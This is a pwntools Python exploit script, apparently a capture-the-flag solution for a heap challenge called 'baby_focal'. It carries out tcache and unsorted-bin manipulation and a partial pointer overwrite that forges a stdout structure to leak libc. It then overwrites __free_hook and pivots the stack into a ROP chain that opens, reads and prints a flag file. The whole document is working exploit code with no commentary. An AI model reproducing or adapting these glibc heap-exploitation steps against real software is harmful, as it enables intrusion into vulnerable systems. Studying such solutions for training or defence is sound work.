# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './baby_focal'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    # context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(idx , size):
    cmd(1)
    sla('index >>' , idx)
    sla('size >>' , size)

def edit(idx , content):
    cmd(2)
    sla('index >>' , idx)
    sa('content >>' , content)

def delete(idx ):
    cmd(3)
    sla('index >>' , idx)

# one_gad = one_gadget(libc.path)
# $rebase(0x404068)

def attack():
    
    ptr_list = 0x404068

    sla('name:' , 'a')
    for i in range(7):
        add(0 , 0x68)
        delete(0)
    add(0 , 0x68)
    add(1 , 0x418)
    add(2 , 0x68)
    add(3 , 0x18)
    add(4 , 0x68)

    delete(2)
    edit( 0 , flat( '\x00'*0x60 , 0 , 0x70 + 0x421 ) + '\n' )
    delete(1)
    add(1, 0x300)
    add(1 ,0x108)
    edit( 1 , flat( '\x00'*0x100 , 0 , 0x71) + p16(0x265d) + '\n' )
    add( 2, 0x68 )
    add( 2, 0x68 )

    fake_io = '\x00'*0x33 + flat( 0xfbad1800 , 0,0,0 ) + '\x00'

    edit( 2 , fake_io + '\n')
    _IO_2_1_stdin_ = l64() 
    libc.address = _IO_2_1_stdin_ - libc.sym['_IO_2_1_stdin_']
    __free_hook = libc.sym['__free_hook']

    delete(4)
    edit( 3 , flat('\x00'*0x10 , 0 , 0x71 , ptr_list - 0x8) )
    add(4 , 0x68)
    add(4 , 0x68)

    fake_list = flat(
        __free_hook , 0x100,
    )

    edit(4 , fake_list  + '\n')

    # 下面 2.31 标准最短开启 orw

    magic = 0x157bfa + libc.address
    
    # svcudp_reply+26
    # mov    rbp, qword ptr [rdi + 0x48]
    # mov    rax, qword ptr [rbp + 0x18]
    # lea    r13, [rbp + 0x10]
    # mov    dword ptr [rbp + 0x10], 0
    # mov    rdi, r13
    # call   qword ptr [rax + 0x28]
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    ret = libc.search(asm(' ret')).next()
    leave_ret_res = libc.search(asm('leave;ret'))
    leave_ret = leave_ret_res.next()
    leave_ret = leave_ret_res.next()
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_r13_pop_r15_ret = libc.search(asm('pop r13 ; pop r15 ; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    
    magic_chain  = flat(
        __free_hook + 0x8, pop_r13_pop_r15_ret , 
        __free_hook + 0x8, __free_hook + 0x10 ,
        pop_rdx_pop_rbx_ret, 0x300 ,
        leave_ret, pop_rsi_ret,
        __free_hook + 0x8 , pop_rdi_ret , 
        0 , read_addr 
    )
    # len magic_chain 0x60
    flag_addr = __free_hook + 0x100 + len(magic_chain) + 8
    chain = flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , flag_addr , puts_addr
    ).ljust(0x100,'\x00') + 'flag\x00'
    # len chain 0x80
    
    payload = flat( magic ) + magic_chain 
    # payload = 'a'*0x68

    edit(1 , payload + '\n')

    # dbg('free')
    delete(1)
    payload =p64(ret)*0xc + chain
    se( payload)
    # dbg()
    # sl('echo shell')
    # ru('shell')
    p.interactive()

exhaust(attack)
# attack()

'''
@File    :   baby_focal.py
@Time    :   2021/10/20 22:47:57
@Author  :   Niyah 
'''